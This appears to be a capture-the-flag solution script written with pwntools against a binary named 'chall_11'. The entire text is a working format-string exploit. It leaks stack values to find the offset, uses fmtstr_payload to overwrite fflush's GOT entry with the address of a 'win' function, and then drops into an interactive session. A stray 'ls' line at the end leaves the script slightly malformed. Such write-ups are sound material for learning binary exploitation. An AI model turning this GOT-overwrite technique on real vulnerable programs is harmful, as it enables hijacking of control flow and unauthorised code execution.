from pwn import *
p = process ("./chall_11")
context.arch = "i386" 
elf = ELF("./chall_11") 

p.sendline()
#p.sendline(AAAA.%p.%p.%p.%p.%p.%p.%p) //we use this to determine the offset, it's 6 spaces off

location = 6

payload = b''
payload += fmtstr_payload(location, {elf.got.fflush : elf.sym.win})
p.sendline(payload)
p.interactive()
ls
